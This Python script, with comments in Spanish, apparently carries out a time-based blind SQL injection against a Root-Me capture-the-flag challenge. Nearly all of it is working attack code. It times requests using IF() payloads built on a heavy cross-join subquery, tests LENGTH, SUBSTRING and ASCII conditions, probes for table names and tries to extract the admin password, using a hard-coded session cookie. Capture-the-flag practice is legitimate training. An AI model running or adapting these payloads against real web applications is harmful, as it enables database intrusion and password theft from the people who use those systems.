#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN DEPURACIÓN - VERIFICAR CONDICIONES
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class DebugInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        
    def test_payload(self, payload, repeats=3):
        tiempos = []
        params = {"action": "member", "member": payload}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = f"1 AND IF({condition}, {self.heavy}, 0)"
        t = self.test_payload(payload)
        return t > self.threshold
    
    def debug_condition(self, condition):
        """Depura una condición mostrando el tiempo exacto"""
        t = self.test_payload(f"1 AND IF({condition}, {self.heavy}, 0)")
        print(f"  {condition[:60]:60} -> {t:.2f}ms -> {'TRUE' if t > self.threshold else 'FALSE'}")
        return t

# EJECUCIÓN
injector = DebugInjector()

print("=" * 70)
print("  DEPURACIÓN - VERIFICANDO CONDICIONES")
print("=" * 70)

print(f"\nBaseline: {injector.baseline:.2f}ms")
print(f"Threshold: {injector.threshold:.2f}ms")
print()

# 1. Probar condiciones simples
print("[1] Probando condiciones simples:")
injector.debug_condition("1=1")
injector.debug_condition("1=2")
injector.debug_condition("'1'='1'")
injector.debug_condition("'1'='2'")

# 2. Probar LENGTH con valores conocidos
print("\n[2] Probando LENGTH con valores conocidos:")
injector.debug_condition("LENGTH('abc') = 3")
injector.debug_condition("LENGTH('abc') = 1")
injector.debug_condition("LENGTH('a') = 1")
injector.debug_condition("LENGTH('a') = 2")

# 3. Probar LENGTH con consultas
print("\n[3] Probando LENGTH con consultas:")
injector.debug_condition("LENGTH((SELECT 'abc')) = 3")
injector.debug_condition("LENGTH((SELECT 'abc')) = 1")
injector.debug_condition("LENGTH((SELECT VERSION())) = 10")
injector.debug_condition("LENGTH((SELECT DATABASE())) = 1")

# 4. Probar SUBSTRING con valores conocidos
print("\n[4] Probando SUBSTRING con valores conocidos:")
injector.debug_condition("SUBSTRING('abc', 1, 1) = 'a'")
injector.debug_condition("SUBSTRING('abc', 2, 1) = 'b'")
injector.debug_condition("SUBSTRING('abc', 3, 1) = 'c'")

# 5. Probar ASCII
print("\n[5] Probando ASCII:")
injector.debug_condition("ASCII('a') = 97")
injector.debug_condition("ASCII('a') = 98")
injector.debug_condition("ASCII(SUBSTRING('abc', 1, 1)) = 97")
injector.debug_condition("ASCII(SUBSTRING('abc', 2, 1)) = 98")

# 6. Probar EXISTS con tablas reales
print("\n[6] Probando EXISTS con tablas:")
injector.debug_condition("EXISTS(SELECT * FROM usuarios)")
injector.debug_condition("EXISTS(SELECT * FROM users)")
injector.debug_condition("EXISTS(SELECT * FROM tabla_falsa)")

# 7. Probar consulta directa de contraseña
print("\n[7] Probando consulta de contraseña:")
injector.debug_condition("(SELECT pass FROM usuarios WHERE username='admin') = 'k'")
injector.debug_condition("(SELECT pass FROM usuarios WHERE username='admin') = 'admin'")

# 8. Probar con NULL
print("\n[8] Probando con NULL:")
injector.debug_condition("1=1 AND (SELECT NULL)")
injector.debug_condition("1=1 AND (SELECT NULL) IS NULL")
